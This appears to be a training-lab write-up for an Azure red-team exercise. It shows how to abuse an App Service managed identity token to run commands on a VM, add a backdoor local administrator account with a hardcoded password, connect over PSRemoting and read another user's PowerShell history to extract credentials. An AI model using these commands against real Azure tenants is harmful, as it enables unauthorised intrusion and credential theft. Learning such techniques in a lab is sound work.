## Objective 15 ***Part of - Kill Chain - 1***


```
- Abuse the permissions that Managed Identity of the 'defcorphqcareer' App Service to get command execution on an Azure VM.
- Extract credentials from the target VM.
```
- We already know that the managed identity of the defcorphqcareer app service has ability to execute commands on the **bkpadconnect VM**
  Upload the C:\AzAD\Tools\studentxtoken.phtml to get a new access token for the managed identity. 

```powershell
$AccessToken = 'eyJ0…'
Connect-AzAccount -AccessToken $AccessToken -AccountId 064aaf57-30af-41f0-840a-0e21ed149946
```

- Check if there is a public IP address attached to the VM
```powershell
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile
```
- Get more details about the network interface attached to the VM
```powershell
Get-AzNetworkInterface -Name bkpadconnect368
```
- Get the public IP address attached to the VM:
```powershell
Get-AzPublicIpAddress -Name bkpadconnectIP
```
![test](/img/obj15.png "Enumeration")

- Connect **bkpadconnect VM** with PSRemoting and run the `adduser.ps1` 
  adduser.ps1
  ```powershell
  # adduser.ps1 script

  $passwd = ConvertTo-SecureString "StudXPassword@123" -AsPlainText -Force
  New-LocalUser -Name studentX -Password $passwd
  Add-LocalGroupMember -Group Administrators -Member studentx
  ```

  Execute the command on the **bkpadconnect VM**
  ```powershell
  Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
  ```
  Connect to **bkpadconnect VM**
  ```powershell
  $password = ConvertTo-SecureString 'StudxPassword@123' -AsPlainText -Force
  $creds = New-Object System.Management.Automation.PSCredential('studentx', $Password)
  $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
  Enter-PSSession $sess
  ```

  Now, there are many ways to extract credentials from the VM – lsass, registry, DPAPI etc. Assuming that we tried them and then we found credentials in the PowerShell console history of the bkpadconnect user
  ```powershell
  Get-LocalUser
  cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  ```
  ![test](/img/obj15a.png "Enumeration")